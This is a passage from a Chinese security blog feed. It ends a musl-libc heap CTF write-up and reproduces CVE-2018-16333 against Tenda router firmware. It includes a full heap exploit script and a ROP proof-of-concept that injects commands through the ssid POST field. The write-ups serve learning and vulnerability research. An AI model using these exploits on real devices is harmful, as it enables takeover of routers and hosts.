class="hljs-string">m-&gt;prev-&gt;next = m-&gt;next; // 这里存在指针互写 在 prev 所指地址上 写入next 指针</span><br><span class="hljs-string">m-&gt;next-&gt;prev = m-&gt;prev; // 在next 所指地址上 写入prev 指针</span><br><span class="hljs-string"></span><br><span class="hljs-string">P = m-&gt;prev</span><br><span class="hljs-string">N = m-&gt;next</span><br><span class="hljs-string"></span><br><span class="hljs-string">*(P + 8) = N</span><br><span class="hljs-string">*(N + 0）= P</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># fake_meta</span><br>payload1 += p64(ofl_head_addr - <span class="hljs-number">0x8</span>) <span class="hljs-comment"># prev | target - 8</span><br>payload1 += p64(fake_mem_addr) <span class="hljs-comment"># next | target_value</span><br>payload1 += p64(fake_mem_addr) <span class="hljs-comment"># mem | 这个地址必须指向group，get_meta函数中会检查meta 是否指向对应的group</span><br>payload1 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># avail_mask</span><br>payload1 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># freed_mask</span><br>payload1 += p64((maplen&lt;&lt;<span class="hljs-number">12</span>)|(sc&lt;&lt;<span class="hljs-number">6</span>)|(freeable&lt;&lt;<span class="hljs-number">5</span>)|last_idx)<br>payload1 += p64(<span class="hljs-number">0</span>)<br><br>delete(<span class="hljs-number">9</span>) <span class="hljs-comment"># 空出2个0xc的chunk</span><br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x2000</span>,payload1) <span class="hljs-comment"># 9</span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x2000</span>,<span class="hljs-string">&#x27;D&#x27;</span>) <span class="hljs-comment"># 申请多余的那一个空闲chunk(size=0xc),减少影响</span><br><br>log.info(<span class="hljs-string">&quot;leak address of ORW &amp; fake meta &amp; fake meta_area&quot;</span>)<br>delete(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">8</span>)<br>p.recvuntil(<span class="hljs-string">&quot;E\n&quot;</span>)<br>mmaped_page = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20</span> <span class="hljs-comment"># 0x7ffff7fee000 前20字节是元数据，payload是从0x7ffff7fee020开始的</span><br>log.success(<span class="hljs-string">&quot;mmaped_page: &quot;</span> + <span class="hljs-built_in">hex</span>(mmaped_page)) <span class="hljs-comment"># payload1存放的内存地址，包含了ORW和fake_meta</span><br>orw_addr = mmaped_page + <span class="hljs-number">0x300</span> + <span class="hljs-number">0x20</span><br>fake_meta_addr = mmaped_page + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0x10</span><br><br>log.info(<span class="hljs-string">&quot;build idx &amp; offset to point at fake meta&quot;</span>)<br><span class="hljs-comment"># const struct group *base = (const void *)(p - UNIT*offset - UNIT)  UNIT=0x10</span><br><span class="hljs-comment"># group_base = p - 0x10</span><br>payload2 = p64(fake_meta_addr) <span class="hljs-comment"># 此处是fake_group，值为fake_mata的地址</span><br>payload2 += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># offset = 0 idx = 0 (伪造idx和offset，从而伪造group)</span><br>payload2 += p64(fake_mem_addr + <span class="hljs-number">0x20</span>) <span class="hljs-comment"># 值为fake_mem，此处是chunk地址，确保能正确删除idx=7的内容chunk</span><br><br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,payload2) <span class="hljs-comment"># 根据mem地址确定meta地址</span><br>delete(<span class="hljs-number">7</span>) <span class="hljs-comment"># 删除idx=7的控制chunk时触发deqeune</span><br><br>fake_file = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>fake_file += p64(orw_addr) <span class="hljs-comment"># mustbezero_1 | [rdi+0x30]</span><br>fake_file += p64(ret) <span class="hljs-comment"># wbase | [rdi+0x38]</span><br>fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># (*read)(FILE *, unsigned char *, size_t)</span><br>fake_file += p64(magic_gadget) <span class="hljs-comment"># (*write)(FILE *, const unsigned char *, size_t)</span><br>fake_file = fake_file.ljust(<span class="hljs-number">0x8C</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_file += p32(<span class="hljs-number">0xFFFFFFFF</span>)<br><br><span class="hljs-comment"># 这个0x40取决于idx=4的内容chunk与fake_mem_addr的偏移，使fake_mem_addr处刚好是fake_file</span><br>payload3 = <span class="hljs-string">b&quot;./flag\x00&quot;</span>.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload3 += fake_file<br>payload3 = payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;G&#x27;</span>)<br><br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,payload3)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b write&quot;)</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;4&#x27;</span>) <span class="hljs-comment"># exit</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5 Reference"></a>0x5 Reference</h2><ul><li><a href="http://www.wangqingzheng.com/anquanke/1/241101.html">http://www.wangqingzheng.com/anquanke/1/241101.html</a></li><li><a href="https://www.cjovi.icu/WP/1549.html">https://www.cjovi.icu/WP/1549.html</a></li><li><a href="https://juejin.cn/post/6844903574154002445#heading-9">https://juejin.cn/post/6844903574154002445#heading-9</a></li><li><a href="https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exp">https://niebelungen-d.top/2021/08/22/Musl-libc-Pwn-Learning/#exp</a></li><li><a href="https://ctf.njupt.edu.cn/700.html#musl">https://ctf.njupt.edu.cn/700.html#musl</a></li><li><a href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E7%82%B9-2">https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E7%82%B9-2</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>musl-libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2018-16333复现</title>
    <link href="/2021/09/02/CVE-2018-16333/"/>
    <url>/2021/09/02/CVE-2018-16333/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-漏洞描述"><a href="#0x0-漏洞描述" class="headerlink" title="0x0 漏洞描述"></a>0x0 漏洞描述</h2><p>An issue was discovered on Tenda AC7 V15.03.06.44_CN, AC9 V15.03.05.19(6318)_CN, AC10 V15.03.06.23_CN, AC15 V15.03.05.19_CN, and AC18 V15.03.05.19(6318)_CN devices.</p><p>There is a buffer overflow vulnerability in the router’s web server. While processing the ssid parameter for a POST request, the value is directly used in a sprintf call to a local variable placed on the stack, which overrides the return address of the function, causing a buffer overflow.</p><h2 id="0x1-固件和相关工具"><a href="#0x1-固件和相关工具" class="headerlink" title="0x1 固件和相关工具"></a>0x1 固件和相关工具</h2><ul><li>US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</li><li>gdb、gdb-multiarch</li><li>ida 7.5</li><li>qemu-arm-static</li><li>python3</li></ul><h2 id="0x2-整体分析"><a href="#0x2-整体分析" class="headerlink" title="0x2 整体分析"></a>0x2 整体分析</h2><ul><li>file US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">US_AC15V1</span>.<span class="hljs-number">0</span>BR_V<span class="hljs-number">15.03.05.19</span>_multi_TD01.bin: u-boot legacy uImage, \<span class="hljs-number">002</span>, Linux/ARM, OS Kernel Image (lzma), <span class="hljs-number">10629120</span> bytes, Fri May <span class="hljs-number">26</span> <span class="hljs-number">02</span>:<span class="hljs-number">03</span>:<span class="hljs-number">05</span> <br><span class="hljs-attribute">2017</span>, Load Address: <span class="hljs-number">0</span>x80000000, Entry Point: <span class="hljs-number">0</span>xC0008000, Header CRC: <span class="hljs-number">0</span>x1FE383A9, Data CRC: <span class="hljs-number">0</span>xE67F312E<br></code></pre></td></tr></table></figure><ul><li>使用binwalk获取固件信息</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">binwalk</span> <span class="hljs-string">US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</span><br><br><span class="hljs-string">DECIMAL</span>       <span class="hljs-string">HEXADECIMAL</span>     <span class="hljs-string">DESCRIPTION</span><br><span class="hljs-string">--------------------------------------------------------------------------------</span><br><span class="hljs-number">64</span>            <span class="hljs-number">0x40</span>            <span class="hljs-string">TRX</span> <span class="hljs-string">firmware</span> <span class="hljs-string">header,</span> <span class="hljs-string">little</span> <span class="hljs-string">endian,</span> <span class="hljs-attr">image size:</span> <span class="hljs-number">10629120</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">CRC32:</span> <span class="hljs-number">0xAB135998</span><span class="hljs-string">,</span> <span class="hljs-attr">flags:</span> <span class="hljs-number">0x0</span><span class="hljs-string">,</span> <span class="hljs-attr">version:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">header size:</span> <span class="hljs-number">28</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">loader offset:</span> <span class="hljs-number">0x1C</span><span class="hljs-string">,</span> <span class="hljs-attr">linux kernel offset:</span> <span class="hljs-number">0x1C9E58</span><span class="hljs-string">,</span> <span class="hljs-attr">rootfs offset:</span> <span class="hljs-number">0x0</span><br><span class="hljs-number">92</span>            <span class="hljs-number">0x5C</span>            <span class="hljs-string">LZMA</span> <span class="hljs-string">compressed</span> <span class="hljs-string">data,</span> <span class="hljs-attr">properties:</span> <span class="hljs-number">0x5D</span><span class="hljs-string">,</span> <span class="hljs-attr">dictionary size:</span> <span class="hljs-number">65536</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">uncompressed size:</span> <span class="hljs-number">4585280</span> <span class="hljs-string">bytes</span><br><span class="hljs-number">1875608</span>       <span class="hljs-number">0x1C9E98</span>        <span class="hljs-string">Squashfs</span> <span class="hljs-string">filesystem,</span> <span class="hljs-string">little</span> <span class="hljs-string">endian,</span> <span class="hljs-string">version</span> <span class="hljs-number">4.0</span><span class="hljs-string">,</span> <span class="hljs-string">compression:xz,</span> <span class="hljs-attr">size:</span> <span class="hljs-number">8749996</span> <span class="hljs-string">bytes,</span> <span class="hljs-number">928</span> <span class="hljs-string">inodes,</span> <span class="hljs-attr">blocksize:</span> <span class="hljs-number">131072</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">created:</span> <span class="hljs-number">2017-05-26 02:03:03</span><br></code></pre></td></tr></table></figure><ul><li>使用binwalk提取固件</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binwalk</span> -Me US_AC15V1.<span class="hljs-number">0</span>BR_V<span class="hljs-number">15.03.05.19</span>_multi_TD01.bin<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/1.png" alt="image"></p><ul><li>使用<code>file</code>指令查看漏洞文件<code>httpd</code>的文件信息</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">file</span> .<span class="hljs-regexp">/bin/</span>httpd <br><br>.<span class="hljs-regexp">/bin/</span>httpd: ELF <span class="hljs-number">32</span>-bit LSB executable, ARM, EABI5 version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter <span class="hljs-regexp">/lib/</span>ld-uClibc.so.<span class="hljs-number">0</span>, stripped<br></code></pre></td></tr></table></figure><ul><li>使用<code>checksec</code>指令查看文件的保护机制，可以发现<code>httpd</code>只开启了栈不可执行保护</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">checksec</span> <span class="hljs-string">./bin/httpd</span><br><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">arm-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8000)</span><br></code></pre></td></tr></table></figure><ul><li>漏洞定位：使用<code>ida</code>根据参数名<code>ssid</code>和常用于将数据复制到栈中的<code>strcpy</code>函数定位到函数<code>form_fast_setting_wifi_set</code></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/2.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/3.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/4.png" alt="image"></p><blockquote><p>获取ssid的值之后，赋给局部变量src，然后没用任何检查地赋值给局部变量s[64]和dest[64]</p></blockquote><h2 id="0x3-环境修复"><a href="#0x3-环境修复" class="headerlink" title="0x3 环境修复"></a>0x3 环境修复</h2><ul><li>使用<code>qemu-arm-static</code>尝试运行<code>httpd</code></li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo chroot .<span class="hljs-regexp">/ ./</span>qemu-arm-<span class="hljs-keyword">static</span> .<span class="hljs-regexp">/bin/</span>httpd<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/5.png" alt="image"></p><ul><li>使用<code>netstat -ano</code>发现服务没用启动，因此使用如下指令查看故障信息：</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo chroot .<span class="hljs-regexp">/ ./</span>qemu-arm-<span class="hljs-keyword">static</span> -strace .<span class="hljs-regexp">/bin/</span>httpd<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/6.png" alt="image"></p><blockquote><p>发现一直循环执行<code>ioctl(3,35093,-150997516,-150997532,1045432,-150997004)</code>,返回值都是-1，报错<code>No such device</code></p></blockquote><ul><li>根据字符串在程序中进行定位查找，然后根据循环推测出：网络检查不通过，所以一直循环检查网络</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/7.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/8.png" alt="image"></p><blockquote><p>不知道它的代码逻辑，那就只能尝试看看patch，需要注意的是，patch前后的size一定要一样，如果不一样可以尝试使用<code>NOP</code>指令填充。</p></blockquote><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/9.png" alt="image"></p><ul><li>将patch后的文件改名为<code>httpd_patch_1</code>，并添加可执行权限，然后再次使用qemu执行</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/10.png" alt="image"></p><ul><li>发现还是报错，根据报错信息在ida中进行查找</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/11.png" alt="image"></p><blockquote><p>造成原因就说ConnectCfm函数的返回值不等于1，并且不知道ConnectCfm代码逻辑，所以只能再次尝试Patch</p></blockquote><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/12.png" alt="image"></p><blockquote><p>切记：Patch完之后，一定要<code>Edit</code>-&gt;<code>Patch Program</code>-&gt;<code>Apply Patches to input file ...</code>来真正地patch二进制文件，否则，二进制文件是没有被修改的。</p></blockquote><ul><li>将第二次patch后的文件改名为<code>httpd_patch_2</code>，并添加可执行权限，然后使用qemu执行</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/13.png" alt="image"></p><ul><li>这次运行成功了，但是IP地址明显不对，所以我们还是需要查看一下程序是如何确定IP地址的，根据字符串“httpd listen ip &#x3D;”交叉引用定位到函数<code>sub_1b84c</code>，然后跟踪发现，IP地址是由该函数的第一个参数决定的，所以查看该函数的交叉引用，根据字符串“webs: Listening for HTTP requests at address”分析确定函数<code>sub_29818</code>,分析该函数发现IP地址由<code>g_lan_ip</code>决定，对其交叉引用，发现函数<code>sub_2E420</code>对其进行赋值操作。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/14.png" alt="image"></p><ul><li>到这里就懵了，因为不清楚函数<code>GetValue</code>的代码逻辑，所以不清楚怎么来修改<code>g_lan_ip</code>。在网上找到同系列路由器固件复现<a href="https://xz.aliyun.com/t/7357">文章</a>，得知函数逻辑是寻找<code>br0</code>这个网络接口的IP,并在这个ip进行监听。并给出两个解决方案：</li></ul><ol><li>对源程序进行patch,将<code>br0</code>这个接口更改为本机的<code>ens33</code>这个网卡；</li><li>在本机新建一个桥接网卡<code>br0</code></li></ol><ul><li>为了方便，就直接在本地创建一个名为<code>br0</code>的网卡。</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">查看网卡：<br><span class="hljs-symbol">iwconfig</span> <br>在 Host 机上创建一个 br0 接口并分配 <span class="hljs-built_in">IP</span>：<br><span class="hljs-symbol">sudo</span> tunctl -t br0 -u `whoami`<br><span class="hljs-symbol">sudo</span> ifconfig br0 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">32</span>.<span class="hljs-number">101</span>/<span class="hljs-number">24</span><br>这个<span class="hljs-built_in">IP</span>不一定要与虚拟机的<span class="hljs-built_in">IP</span>在同一局域网<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/15.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/16.png" alt="image"></p><ul><li>qemu仿真成功，并且地址真的是网卡<code>br0</code>的地址</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/17.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/18.png" alt="image"></p><h2 id="0x4-动态调试"><a href="#0x4-动态调试" class="headerlink" title="0x4 动态调试"></a>0x4 动态调试</h2><ul><li><code>gdb-multiarch</code>脚本script:</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br>target <span class="hljs-comment">remote:1234</span><br>b <span class="hljs-comment">*0x0002E420</span><br>b <span class="hljs-comment">*0x00066EE0</span><br>b <span class="hljs-comment">*0x00067080</span><br>b <span class="hljs-comment">*0x00067094</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x0002E420</span> -&gt;</span> sub_2E420<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x00066EE0</span> -&gt;</span> form_fast_setting_wifi_set<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x00067080</span> -&gt;</span> first strcpy<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x00067094</span> -&gt;</span> second strcpy<br></code></pre></td></tr></table></figure><ul><li>依次执行以下指令：</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo chroot .<span class="hljs-regexp">/ ./</span>qemu-arm-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> .<span class="hljs-regexp">/bin/</span>httpd_patch_2<br>gdb-multiarch .<span class="hljs-regexp">/bin/</span>httpd_patch_2 -x script<br></code></pre></td></tr></table></figure><ul><li><p>在<code>gdb</code>中，使用指令<code>c</code>执行到服务开启，然后可以<code>POST</code>方式访问<code>http://192.168.32.101/goform/fast_setting_wifi_set</code>,传参<code>ssid=xxxx</code></p></li><li><p>在一篇<a href="https://cq674350529.github.io/2020/05/09/%E6%8A%80%E5%B7%A7misc/">博客</a>了解到在仿真的程序中又调用execve()来运行其他程序时，会默认会使用x86&#x2F;x86_64架构的ld来加载程序。</p></li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">查看主机系统上的qemu-arm文件<br>cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/fs/</span>binfmt_misc/qemu-arm <br>enabled<br>interpreter <span class="hljs-regexp">/usr/</span>bin/qemu-arm-<span class="hljs-keyword">static</span><br>flags: OC<br>offset <span class="hljs-number">0</span><br>magic <span class="hljs-number">7</span>f454c4601010100000000000000000002002800<br>mask ffffffffffffff00fffffffffffffffffeffffff<br><br>根据interpreter的路径，在路由器文件系统中相同路径下复制一个qemu-arm-<span class="hljs-keyword">static</span>文件即可<br></code></pre></td></tr></table></figure><ul><li>动态调试总结</li></ul><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-number">1</span>. sub_2E420函数执行完成时，服务开启，等待客户端进行访问<br><span class="hljs-number">2</span>. 访问上述URL后，会执行form_fast_setting_wifi_set函数,触发栈溢出漏洞<br><span class="hljs-number">3</span>. 漏洞利用是在第一个<span class="hljs-keyword">strcpy</span>处<br><span class="hljs-number">4</span>. form_fast_setting_wifi_set函数地栈帧及利用思路如下图<br><span class="hljs-number">5</span>. 传输的payload中必须不存在 \x00 字节，否则会被<span class="hljs-keyword">strcpy</span>截断,导致出错<br><span class="hljs-number">6</span>. 根据栈帧可知，第一次的<span class="hljs-keyword">strcpy</span>如果要溢出到返回地址，会覆盖第二次的<span class="hljs-keyword">strcpy</span>的参数dest。因此需要用可读内存的地址覆盖src指针。<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/19.png" alt="image"></p><h2 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h2><ul><li>Poc</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-keyword">from</span> pwn import *<br><br>cmd = b<span class="hljs-string">&quot;ls /bin&quot;</span><br><span class="hljs-comment"># cmd = b&quot;echo $PATH&quot;</span><br><br>libc_base = 0xf659c000<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc_base + 0x1a20f4<br>readable_addr = libc_base + 0x64144 # -&gt; <span class="hljs-string">&quot;HOME&quot;</span><br>mov_r0_ret_r3 = libc_base + 0x47738 # mov r0 , sp; blx r3<br>pop_r3 = libc_base + 0x18298 # pop r3<br><br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;system: &quot;</span> + hex(system))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;readable_addr: &quot;</span> + hex(readable_addr))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;mov_r0_ret_r3: &quot;</span> + hex(mov_r0_ret_r3))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;pop_r3: &quot;</span> + hex(pop_r3))<br><br><span class="hljs-comment">#payload不能存在\x00</span><br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(0x60) + p32(readable_addr) + b<span class="hljs-string">&#x27;B&#x27;</span>*(0x20-8)<br>payload += p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd<br><br>url = <span class="hljs-string">&quot;http://192.168.32.101/goform/fast_setting_wifi_set&quot;</span><br>cookie = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;password=12345&quot;</span>&#125;<br>data = &#123;<span class="hljs-string">&quot;ssid&quot;</span>: payload&#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting!!&quot;</span>)<br><span class="hljs-comment"># 根据前人经验和多次调试发现，的确是需要2次访问才能触发漏洞，第一次不能触发form_fast_setting_wifi_set函数</span><br>response = requests.post(url, <span class="hljs-attribute">cookies</span>=cookie, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done1!!&quot;</span>)<br>response = requests.post(url, <span class="hljs-attribute">cookies</span>=cookie, <span class="hljs-attribute">data</span>=data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done2!!&quot;</span>)<br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><ul><li>根据gdb中的<code>vmmap</code>指令发现动态库是<code>./lib/libc.so.0</code>寻找Gadget</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ROPgadget --binary .<span class="hljs-regexp">/lib/</span>libc.so.<span class="hljs-number">0</span> --only <span class="hljs-string">&quot;pop&quot;</span>| <span class="hljs-keyword">grep</span> r3<br>ROPgadget --binary .<span class="hljs-regexp">/lib/</span>libc.so.<span class="hljs-number">0</span>  | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mov r0, sp ; blx r3&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/20.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/21.png" alt="image"></p><ul><li>ROP</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">form_fast_setting_wifi_set</span>的结尾处<br><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">SP</span>, <span class="hljs-built_in">R11</span>, <span class="hljs-number">#0xC</span><br><span class="hljs-keyword">POP</span> &#123;<span class="hljs-built_in">R4</span>,<span class="hljs-built_in">R5</span>,<span class="hljs-built_in">R11</span>,<span class="hljs-built_in">PC</span>&#125;<br><br>等价于：<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">SP</span>, <span class="hljs-built_in">R11</span><br><span class="hljs-keyword">POP</span> <span 